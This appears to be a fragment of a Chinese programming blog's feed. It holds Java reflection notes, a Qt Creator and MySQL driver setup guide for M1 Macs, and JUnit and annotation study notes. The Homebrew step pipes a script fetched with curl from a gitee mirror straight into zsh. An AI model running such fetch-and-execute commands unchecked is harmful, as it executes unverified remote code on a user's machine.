prop.getProperty(<span class="hljs-string">&quot;methodName&quot;</span>);<br><span class="hljs-comment">//通过反射使用</span><br>Class&lt;?&gt; c = Class.forName(className);<span class="hljs-comment">//com.itheima.S</span><br>Constructor&lt;?&gt; con = c.getConstructor();<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> con.newInstance();<br><span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.getMethod(methodName);<span class="hljs-comment">//study</span><br>m.invoke(obj);<br></code></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>M1 mac下搭建使用qt creator + QMYSQL驱动</title>
      <link href="/2022/08/06/M1-mac%E4%B8%8B%E6%90%AD%E5%BB%BA%E4%BD%BF%E7%94%A8qt-creator-QMYSQL%E9%A9%B1%E5%8A%A8/"/>
      <url>/2022/08/06/M1-mac%E4%B8%8B%E6%90%AD%E5%BB%BA%E4%BD%BF%E7%94%A8qt-creator-QMYSQL%E9%A9%B1%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="💡前提：安装Xcode"><a href="#💡前提：安装Xcode" class="headerlink" title="💡前提：安装Xcode"></a>💡前提：安装Xcode</h3><h2 id="安装homebrew"><a href="#安装homebrew" class="headerlink" title="安装homebrew"></a>安装homebrew</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)&quot;<br></code></pre></td></tr></table></figure><p>选择中科大镜像，并安装弹窗中的命令行开发者工具，安装完再执行以上命令</p><p>切换国内安装源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd &quot;$(brew --repo)&quot; &amp;&amp; git remote set-url origin git://mirrors.ustc.edu.cn/brew.git &amp;&amp; cd &quot;$(brew --repo)/Library/Taps/homebrew/homebrew-core&quot; &amp;&amp; git remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git &amp;&amp; cd &quot;$(brew --repo)/Library/Taps/homebrew/homebrew-cask&quot; &amp;&amp; git remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git &amp;&amp; cd &quot;$(brew --repo)&quot;/Library/Taps/homebrew/homebrew-cask-versions &amp;&amp; git remote set-url origin https://github.com/Homebrew/homebrew-cask-versions.git<br></code></pre></td></tr></table></figure><p>重启终端，下载qt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">brew install qt<br></code></pre></td></tr></table></figure><p>检验是否安装成功,执行以下命令，回显信息比较多，可以看见路径</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">brew info qt<br></code></pre></td></tr></table></figure><p><img src="/../images/e6c9d24egy1h1ub18t5pfj20vm0jq7a1.png" alt="1"></p><h2 id="安装HomeBrew-Cask"><a href="#安装HomeBrew-Cask" class="headerlink" title="安装HomeBrew-Cask"></a>安装HomeBrew-Cask</h2><p>cask可以安装.app的软件</p><p>方法一：利用国内源手动clone下载（推荐）<br>创建homebrew-cask文件夹<br>进入homebrew目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(brew --repo)</span>/Library/Taps/homebrew/&quot;</span><br></code></pre></td></tr></table></figure><p>创建homebrew-cask文件夹</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mkdir homebrew-cask<br></code></pre></td></tr></table></figure><p>开始clone</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone git:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/homebrew-cask.git/u</span>sr<span class="hljs-regexp">/local/</span>Homebrew<span class="hljs-regexp">/Library/</span>Taps<span class="hljs-regexp">/homebrew/</span>homebrew-cask<br></code></pre></td></tr></table></figure><p>方法二：利用官网文件安装<br>从官网上下载<code>homebrew-cask-master.zip</code>压缩包，解压后将文件夹名改为<code>homebrew-cask</code><br>然后将其拷贝放入<code>/usr/local/Homebrew/Library/Taps/homebrew</code>中，与<code>homebrew-core</code>文件夹同级    </p><blockquote><p>官网: <a href="https://github.com/Homebrew/homebrew-cask">https://github.com/Homebrew/homebrew-cask</a></p></blockquote><h2 id="安装qt-creator"><a href="#安装qt-creator" class="headerlink" title="安装qt creator"></a>安装qt creator</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">brew </span><span class="hljs-keyword">install </span>qt-creator<br></code></pre></td></tr></table></figure><p>安装完发现启动台多了一个软件，打开</p><p><img src="/../images/e6c9d24egy1h1ub7miil3j20bo086wej.png" alt="."></p><h2 id="配置qt-creator"><a href="#配置qt-creator" class="headerlink" title="配置qt creator"></a>配置qt creator</h2><p>打开首选项<img src="/../images/e6c9d24egy1h1ub8lv3wbj20ds0e6gmk.png?" alt="."></p><p>配置kits，主要是Qt Version和Debuggers</p><p>e6c9d24egy1h1ub8lv3wbj20ds0e6gmk<img src="/../images/e6c9d24egy1h1ucbt7jxhj21ef0u0jvk.png" alt="2"></p><h3 id="配置Qt-Version"><a href="#配置Qt-Version" class="headerlink" title="配置Qt Version"></a>配置Qt Version</h3><p>在终端先查看qt路径</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">brew</span> <span class="hljs-literal">info</span> qt<br></code></pre></td></tr></table></figure><p><img src="/../images/e6c9d24egy1h1ucdiut0nj21ce0hoq9l.png" alt="3"></p><blockquote><p>以我这里为例是在<code>/opt/homebrew/Cellar/qt/6.2.3_1</code></p></blockquote><p>进入该文件夹，访问<code>bin</code>文件夹，找到qmake文件，最后将该路径填入Qt version</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>qt<span class="hljs-regexp">/6.2.3_1/</span>bin/qmake<br></code></pre></td></tr></table></figure><p><img src="/../images/e6c9d24egy1h1ucgvl5bhj21f70u0dk0.png" alt="4"></p><h3 id="配置Debuggers"><a href="#配置Debuggers" class="headerlink" title="配置Debuggers"></a>配置Debuggers</h3><p>一般有默认自动检测到的LLDB，如果没有就添加我图示中Xcode下的LLDB(要先装Xcode)</p><p>路径：<code>/Applications/Xcode.app/Contents/Developer/usr/bin/lldb</code></p><p><img src="/../images/e6c9d24egy1h1ucjcdt7hj21dx0u00vy.png" alt="5"></p><h3 id="返回到Kits选择刚刚配置好的版本"><a href="#返回到Kits选择刚刚配置好的版本" class="headerlink" title="返回到Kits选择刚刚配置好的版本"></a>返回到Kits选择刚刚配置好的版本</h3><p>一般情况下这里的编译器(Compiler)都会自动检测到本机所带环境，不用更改</p><p><img src="/../images/e6c9d24egy1h1uckxzx6bj21n00u0q81.png" alt="6"></p><h3 id="新建一个项目"><a href="#新建一个项目" class="headerlink" title="新建一个项目"></a>新建一个项目</h3><p><img src="/../images/e6c9d24egy1h1ucm7hh0gj21ni0u076u.png" alt="7"></p><h3 id="选择模版"><a href="#选择模版" class="headerlink" title="选择模版"></a>选择模版</h3><p><img src="/../images/e6c9d24egy1h1ucmnslqlj21c60u0acl.png" alt="8"></p><h3 id="选择路径-不能带中文"><a href="#选择路径-不能带中文" class="headerlink" title="选择路径(不能带中文)"></a>选择路径(不能带中文)</h3><p><img src="/../images/e6c9d24egy1h1ucnji2ynj218g0tcwgp.png" alt="9"></p><h3 id="选择qmake"><a href="#选择qmake" class="headerlink" title="选择qmake"></a>选择qmake</h3><p><img src="/../images/e6c9d24egy1h1uco09mb9j218g0tcgn0.png" alt="10"></p><h3 id="剩下一直都点继续，直到Kits-选择刚刚配置的"><a href="#剩下一直都点继续，直到Kits-选择刚刚配置的" class="headerlink" title="剩下一直都点继续，直到Kits,选择刚刚配置的"></a>剩下一直都点继续，直到Kits,选择刚刚配置的</h3><p><img src="/../images/e6c9d24egy1h1ucp7tqxcj218g0tc76c.png" alt="11"></p><h3 id="构建项目"><a href="#构建项目" class="headerlink" title="构建项目"></a>构建项目</h3><p><img src="/../images/e6c9d24egy1h1ucpqyve4j218g0tcjtd.png" alt="12"></p><h3 id="运行项目，会自动生成一个默认的空白框"><a href="#运行项目，会自动生成一个默认的空白框" class="headerlink" title="运行项目，会自动生成一个默认的空白框"></a>运行项目，会自动生成一个默认的空白框</h3><p><img src="/../images/e6c9d24egy1h1ucr1dk8zj20tg0gqdgs.png" alt="."></p><p><img src="/../images/e6c9d24egy1h1ucrjmkltj20zu0si750.png" alt="."></p><blockquote><p>具体的使用可以去b站搜qt教程</p></blockquote><h2 id="Qt搭配mysql"><a href="#Qt搭配mysql" class="headerlink" title="Qt搭配mysql"></a>Qt搭配mysql</h2><h3 id="动态链接库下载"><a href="#动态链接库下载" class="headerlink" title="动态链接库下载"></a>动态链接库下载</h3><p>若要搭配mysql写项目，需要添加动态链接库<code>libqsqlmysql.dylib</code>，网上大部分教程都是下载qt源码进行编译，但由于M1是arm64架构，编译的过程会有很多报错以及路径不对的问题，网上能下载的动态链接库也大多不是arm架构的，因此不得不提到mac下的神器<code>homebrew</code>,终端执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">brew install qt-mysql<br></code></pre></td></tr></table></figure><blockquote><p>brew会自动匹配下载最新qt版本的动态链接库，因此建议qt也使用homebrew安装</p></blockquote><p>进入目录<code>/opt/homebrew/Cellar/qt-mysql/6.2.3/share/qt/plugins/sqldrivers</code>将这个动态链接库放到<code>/opt/homebrew/Cellar/qt/6.2.3_1/share/qt/plugins/sqldrivers</code>中</p><p><img src="/../images/e6c9d24ely1h4xfpipwhjj21fg0okgng.png" alt="13"></p><blockquote><p>注意版本号对应</p></blockquote><h3 id="引入SQL模块"><a href="#引入SQL模块" class="headerlink" title="引入SQL模块"></a>引入SQL模块</h3><p>在项目的.pro文件的首行加上sql</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp">QT       += core gui sql <span class="hljs-comment">//修改处</span><br><br><span class="hljs-built_in">greaterThan</span>(QT_MAJOR_VERSION, <span class="hljs-number">4</span>): QT += widgets<br><br>CONFIG += c++<span class="hljs-number">17</span><br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><h3 id="连接mysql数据库"><a href="#连接mysql数据库" class="headerlink" title="连接mysql数据库"></a>连接mysql数据库</h3><p>进入qt项目执行以下代码打印数据库驱动</p><p>mainwindow.cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mainwindow.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;ui_mainwindow.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;QSqlDatabase&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;QDebug&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;QMessageBox&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;QSqlError&gt;</span></span><br><span class="hljs-comment">//...</span><br><span class="hljs-built_in">qDebug</span>()&lt;&lt;QSqlDatabase::<span class="hljs-built_in">drivers</span>();<span class="hljs-comment">//查看当前可用驱动</span><br></code></pre></td></tr></table></figure><blockquote><p>可用驱动中有QMYSQL即为成功</p><p><img src="/../images/e6c9d24ely1h4xg0zi3z4j20gk02yglv.png" alt="."></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">QSqlDatabase db=QSqlDatabase::<span class="hljs-built_in">addDatabase</span>(<span class="hljs-string">&quot;QMYSQL&quot;</span>);<span class="hljs-comment">//添加一个数据库</span><br>db.<span class="hljs-built_in">setHostName</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<span class="hljs-comment">//设置主机ip</span><br>db.<span class="hljs-built_in">setUserName</span>(<span class="hljs-string">&quot;username&quot;</span>);<span class="hljs-comment">//mysql数据库用户名</span><br>db.<span class="hljs-built_in">setPassword</span>(<span class="hljs-string">&quot;password&quot;</span>);<span class="hljs-comment">//密码</span><br>db.<span class="hljs-built_in">setDatabaseName</span>(<span class="hljs-string">&quot;db&quot;</span>);<span class="hljs-comment">//连接的数据库名</span><br><span class="hljs-keyword">if</span>(db.<span class="hljs-built_in">open</span>()==<span class="hljs-literal">false</span>)&#123;<span class="hljs-comment">//打开失败的警告</span><br>    QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;waring&quot;</span>,db.<span class="hljs-built_in">lastError</span>().<span class="hljs-built_in">text</span>());<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>运行项目只要没有警告框弹出就说明连接数据库成功</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mac </tag>
            
            <tag> qt </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Web学习</title>
      <link href="/2022/07/20/Java-Web%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/07/20/Java-Web%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA-WEB学习"><a href="#JAVA-WEB学习" class="headerlink" title="JAVA WEB学习"></a>JAVA WEB学习</h1><h2 id="Junit-单元测试"><a href="#Junit-单元测试" class="headerlink" title="Junit 单元测试"></a>Junit 单元测试</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><h4 id="0x01-定义一个测试类"><a href="#0x01-定义一个测试类" class="headerlink" title="0x01 定义一个测试类"></a>0x01 定义一个测试类</h4><p>建议：</p><p>测试类名：被测试的类名+Test  e.g. CalculatorTest </p><p>包名：xxx.xxx.xx.test      e.g. cn.itcast.test</p><h4 id="0x02-定义测试方法-可以独立运行"><a href="#0x02-定义测试方法-可以独立运行" class="headerlink" title="0x02 定义测试方法:可以独立运行"></a>0x02 定义测试方法:可以独立运行</h4><p>建议</p><p>方法名：test+测试的方法名 testAdd()</p><p>返回值: void</p><p>参数列表：空参</p><h4 id="0x03-导入junit依赖环境"><a href="#0x03-导入junit依赖环境" class="headerlink" title="0x03 导入junit依赖环境"></a>0x03 导入junit依赖环境</h4><h4 id="0x04-给方法加注解-Test使其能独立运行"><a href="#0x04-给方法加注解-Test使其能独立运行" class="headerlink" title="0x04 给方法加注解@Test使其能独立运行"></a>0x04 给方法加注解@Test使其能独立运行</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CalculatorTest</span> &#123;<br>    <span class="hljs-comment">//自定义初始化方法，用于资源申请，所有测试方法在执行前都先执行这个方法（加注解@Before实现）</span><br>    <span class="hljs-meta">@Before</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;init..&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//释放资源方法，所有测试方法执行完后自动执行（加注解@After实现）</span><br>    <span class="hljs-meta">@After</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;close..&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//测试add方法</span><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testAdd</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">//System.out.println(&quot;被执行&quot;);</span><br>        <span class="hljs-comment">//创建对象</span><br>        Calculator c=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Calculator</span>();<br>        <span class="hljs-type">int</span> res=c.add(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br>        System.out.println(res);<br>        <span class="hljs-comment">//断言判断方法输出</span><br>        Assert.assertEquals(<span class="hljs-number">3</span>,res);<span class="hljs-comment">//第一个参数是期望输出值，若不一样会报错</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>添加断言操作处理结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//断言判断方法输出</span><br>Assert.assertEquals(<span class="hljs-number">3</span>,res);<span class="hljs-comment">//第一个参数是期望输出值，若不一样会报错</span><br></code></pre></td></tr></table></figure></blockquote><h3 id="Before-After"><a href="#Before-After" class="headerlink" title="@Before @After"></a>@Before @After</h3><p>特殊注解，用于指定初始化方法与释放资源方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//自定义初始化方法，用于资源申请，所有测试方法在执行前都先执行这个方法（加注解@Before实现）</span><br><span class="hljs-meta">@Before</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;init..&quot;</span>);<br>&#125;<br><span class="hljs-comment">//释放资源方法，所有测试方法执行完后自动执行（加注解@After实现）</span><br><span class="hljs-meta">@After</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;close..&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>即使测试方法中有报错（如断言报错等）仍会执行@After后方法</p></blockquote><h2 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>代码级别的说明，给计算机看的，JDK1.5后新特性，一般格式：<code>@注解名称</code></p><h3 id="预定义注解"><a href="#预定义注解" class="headerlink" title="预定义注解"></a>预定义注解</h3><ul><li>@Override :检测该注解标注的方法是否是继承自父类或父接口</li><li>@Deprecated ：将该注解标注的内容，已过时</li><li>@SuppressWarnings ：压制警告 （可以放在类的前面，压制其所有警告）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//预定义注解</span><br><span class="hljs-meta">@Override</span><span class="hljs-comment">//检测重写父类/父端口方法</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.toString();<br>&#125;<br><span class="hljs-meta">@Deprecated</span><span class="hljs-comment">//表示标注方法已过时</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show1</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//有缺陷</span><br>&#125;<br><span class="hljs-meta">@SuppressWarnings(&quot;all&quot;)</span><span class="hljs-comment">//压制show2方法的所有警告</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show2</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//代替show1</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="自定义注解"><a href="#自定义注解" class="headerlink" title="自定义注解"></a>自定义注解</h3><h5 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">元注解<br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> 注解名称&#123;<br>  属性列表<br>&#125;<br><span class="hljs-comment">//🌰</span><br><span class="hljs-meta">@Target(value=&#123;ElementType.TYPE&#125;)</span> <span class="hljs-comment">//该注解只能作用与类上</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> MyAnno &#123;<br>    String <span class="hljs-title function_">name</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;sqhy&quot;</span>;<span class="hljs-comment">//使用时可以不用赋值，默认为sqhy</span><br>    <span class="hljs-type">int</span> <span class="hljs-title function_">age</span><span class="hljs-params">()</span>;<br>    Person <span class="hljs-title function_">per</span><span class="hljs-params">()</span>;<br>    MyAnno2 <span class="hljs-title function_">anno2</span><span class="hljs-params">()</span>;<br>    String[] strs();<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>本质是一个接口,默认继承自Annotation接口，该接口是所有注释类型扩展的公共接口，但其本身不定义注释类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> interface 注解名称 <span class="hljs-keyword">extends</span> <span class="hljs-title class_">java</span>.lang.annotation.Annotation &#123;&#125;<br></code></pre></td></tr></table></figure></blockquote><h5 id="注解的属性–可定义的成员方法-接口中的抽象方法"><a href="#注解的属性–可定义的成员方法-接口中的抽象方法" class="headerlink" title="注解的属性–可定义的成员方法(接口中的抽象方法)"></a>注解的属性–可定义的成员方法(接口中的抽象方法)</h5><p>注解的属性类似类的成员变量，取名可以取成变量名，使用时的括号中赋值</p><p><strong>要求</strong></p><ol><li><p>属性的返回类型</p><ul><li>基本数据类型</li><li>String</li><li>枚举</li><li>注解</li><li>以上类型的数组</li></ul></li><li><p>定义了属性，使用时要赋值</p><ul><li><p>可以使用default关键字给属性默认初始化，这样使用时可以不用赋值</p></li><li><p>如果只有一个属性要赋值，并且名称叫value，可以直接括号中定义值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@MyAnno(12)</span><br></code></pre></td></tr></table></figure></li><li><p>数组赋值时，多个元素用{}包裹，如果只有一个值可以省略{}</p></li></ul></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@MyAnno(age=12,per= Person.P1,anno2=@MyAnno2,strs=&#123;&quot;abc&quot;,&quot;sddw&quot;&#125;)</span><br></code></pre></td></tr></table></figure><h4 id="元注解"><a href="#元注解" class="headerlink" title="元注解"></a>元注解</h4><p>描述注解的注解(属性基本都叫value，类型为枚举)</p><ul><li><p>@Target ：描述注解能够作用的位置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(value=&#123;ElementType.TYPE&#125;)</span> <span class="hljs-comment">//该注解只能作用与类上</span><br></code></pre></td></tr></table></figure><ul><li>ElementType取值<ul><li>TYPE:可以作用于类上</li><li>METHOD:可以作用于方法上</li><li>FIELD:可以作用于成员变量上</li></ul></li></ul></li><li><p>@Retention :描述注解能被保留的阶段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><span class="hljs-comment">//当前被描述注解，会保留到class字节码文件中,并被JVM读取到</span><br></code></pre></td></tr></table></figure></li><li><p>@Documented :描述注解是否被抽取到api文档中</p><blockquote><p>api文档，javadoc命令生成的文档（与帮助手册一样）</p></blockquote></li><li><p>@Inherited :描述注解是否被子类继承</p></li></ul><h3 id="程序中使用-解析-注解"><a href="#程序中使用-解析-注解" class="headerlink" title="程序中使用(解析)注解"></a>程序中使用(解析)注解</h3><ol><li><p>获取注解定义的位置下的对象（Class，Method，Field）</p></li><li><p>获取指定注解</p><ul><li><p>getAnnotation(Class)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">pro</span> <span class="hljs-variable">an</span> <span class="hljs-operator">=</span> calculatorTestClass.getAnnotation(pro.class);<br><span class="hljs-comment">//其实就是在内存中生成类一个该注解接口(pro)的子类实现对象</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">pro</span>&#123;<br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">className</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> 配置值;<br>  &#125;<br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">methodName</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> 配置值;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>调用注解中的抽象方法 获取配置的数值</p></li></ol><h3 id="一个简单的测试框架"><a href="#一个简单的测试框架" class="headerlink" title="一个简单的测试框架"></a>一个简单的测试框架</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Calculator.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> a+b;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sub</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span> &#123;<br>        <span class="hljs-keyword">return</span> a-b;<br>    &#125;<br>    <span class="hljs-meta">@Check</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;1+0=&quot;</span>+(<span class="hljs-number">1</span>+<span class="hljs-number">0</span>));<br>    &#125;<br>    <span class="hljs-meta">@Check</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sub</span><span 